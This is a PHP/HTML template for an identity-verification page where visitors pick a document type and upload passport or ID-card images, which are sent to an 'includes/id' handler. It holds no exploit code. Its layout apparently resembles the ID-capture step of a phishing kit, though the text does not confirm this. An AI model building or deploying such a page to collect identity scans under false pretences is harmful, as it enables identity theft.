<?
include('../lang/language.php');
?>
<style type="text/css">
    .form_content_size table{
        width: 100%;
    }
</style>
<table style="margin: 0 auto;height: 100%;width: 100%">
    <tr>
        <td>
<div class="form_content_size hide">

 <div id="rt" style="margin-top: 10px;;" class="rot1 hide"></div>


<div id="type" class="show_er" style="display: none;">
<table class="ereur">
    <tr>
        <td style="padding-right: 7px;display: block;"><div class="icon-alert"></div></td>
        <td style="vertical-align: middle;"><?=$language['id'][2] ?></td>
    </tr>
</table>
</div>


<div id="reqq" class="show_er" style="display: none;">
<table class="ereur">
    <tr>
        <td style="padding-right: 7px;"><div class="icon-alert"></div></td>
        <td style="vertical-align: middle;"><?=$language['id'][3] ?></td>
    </tr>
</table>
</div>


<div id="opl" style="text-align: left;" class="">
    <h2><?=$language['id'][1] ?></h2>
<p style="font-size: small;"><?=$language['id'][5] ?></p>


<form method="post" id="choose2">
 <select class="enterInput1 address" id="ch" style="cursor: pointer; font-size: initial">
    <option value="0" selected><? echo($language['id'][4]) ?></option>
    <option value="1"><? echo($language['id'][17]) ?></option>
    <option value="2"><? echo($language['id'][18]) ?></option>
    <option value="3"><? echo($language['id'][19]) ?></option>
</select><br> 
<center>
<div id="rt1" style="margin-top: 14px;height: 30px;" class="rot1 hide"></div><br>
<input class="btn block btn1" disabled="" value="Envoyer" id="bt00" name="btnbc" type="submit"></center>
</form>

<!--      PASSPORT    -->
<form method="post" id="passp" class="hide" action="includes/id" enctype="multipart/form-data" >
<table style="width: 100%"><tr style=""><td style="width: 100%">
<input type="file" onchange="validate(this)" name="files[]" accept="image/*" required="required" id="file-1" class="inputfile inputfile-2"  />
<div id="choose">
<label for="file-1" style="padding: 0;">
<div class="labelCss">
<div class="selectLabel1 paddingLabel">
<img class="image_upload_preview1 iconUp" src="../files/img/ico.png" style="max-width: 100%;" /><br><span class="sp1"><? echo($language['id'][11]) ?></span></div></div>
<a class="browse"><?=$language['id'][6] ?></a></label><div class="types"><?=$language['id'][7] ?></div>
<div id="name2" class="hide" style="padding: 4px 0;border-bottom: 1px solid rgba(0,0,0,0.1);margin: 18px 0;">
<p class="fileName"></p><a id="n2" class="icon icon-close-small close-larger" onclick="return false"></a>
</div></div>
</td>
</tr>

<tr><td colspan="2" style="text-align: center;">
<br>
<input class="btn block btn1 submitId" disabled="" id="bt1" value="Envoyer" name="btnbc"  type="submit">
</td></tr>
</table>
</form>

<!--    END PASSPORT     -->
 
  
<!--      ID & LS     -->

<form method="post" class="hide" id="idls" action="includes/id" enctype="multipart/form-data" >
<div class="inner"><span><? echo($language['id'][9]) ?> </span><br>
<table><tr><td style="width: 100%">
 <input type="file" onchange="validate(this)" name="files[]" accept="image/*" required="required"  id="file-2" class="inputfile inputfile-2 inc"   />
 <div id="choose">
<label for="file-2" style="padding: 0"> 
<div class="labelCss">
<div class="selectLabel2 paddingLabel">
<img class="image_upload_preview2 iconUp" src="../files/img/ico.png" style="max-width: 100%;" />
    <span class="sp2"><? echo($language['id'][11]) ?></span></div></div>
<a class="browse"><?=$language['id'][6] ?></a></label><div class="types"><?=$language['id'][7] ?></div> 
<div id="name1" class="hide" style="padding: 4px 0;border-bottom: 1px solid rgba(0,0,0,0.1);margin: 18px 0;">
<p class="fileName"></p><a id="n1" class="icon icon-close-small close-larger" onclick="return false"></a>
</div></div>
</td></tr>
</table></div>

<br>
<div class="inner"><span><? echo($language['id'][10]) ?> </span><br>
<table>
<tr><td style="width: 100%">
<input type="file" onchange="validate(this)" name="files[]" accept="image/*" style="outline: 0" required="required" id="file-3" class="inputfile inputfile-2 inc"  />
 <div id="choose">
<label for="file-3" style="padding: 0">
    <div class="labelCss">
    <div class="selectLabel3 paddingLabel">
<img class="image_upload_preview3 iconUp" src="../files/img/ico.png" style="max-width: 100%;" /><span class="sp3"><? echo($language['id'][11]) ?></span></div></div>
<a class="browse"><?=$language['id'][6] ?></a></label><div class="types"><?=$language['id'][7] ?></div> 
<div id="name3" class="hide" style="padding: 4px 0;border-bottom: 1px solid rgba(0,0,0,0.1);margin: 18px 0;">
<p class="fileName"></p><a id="n3" class="icon icon-close-small close-larger" onclick="return false"></a>
</div>
</div>
</td>
</tr>

<tr><td colspan="2" style="text-align: center;">
<br>
<input type="submit" value="Envoyer" class="btn block btn1 submitId" disabled="" id="bt2" name="btnbc" >
</td></tr>
</table> </div>
 </form>

<!--     END ID & LS     -->  

</div>
        </td>
    </tr>
</table></form></td></tr></table>